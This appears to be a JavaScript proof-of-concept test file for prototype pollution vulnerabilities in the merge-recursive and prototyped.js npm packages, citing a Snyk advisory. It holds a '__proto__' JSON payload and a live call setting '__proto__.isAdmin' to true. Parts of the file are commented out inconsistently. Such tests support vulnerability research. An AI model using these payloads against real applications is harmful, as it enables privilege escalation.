// //https://snyk.io/vuln/SNYK-JS-PROTOTYPEDJS-1069824
// test("prototype pollution in merge-recursive", () => {
  // const merge = require("merge-recursive").recursive;
  // const malicious_payload = '{"__proto__":{"polluted":"yes"}}';
  // obj = {};

console.log({}.polluted);

  // merge({}, JSON.parse(malicious_payload));

console.log({}.polluted);

  const set = require("prototyped.js/dist/object/set").default;
//   console.log("Prototype before set", {}.polluted);
  set({}, "__proto__.isAdmin", true);
//   console.log("Prototype after set", {}.polluted);
// });
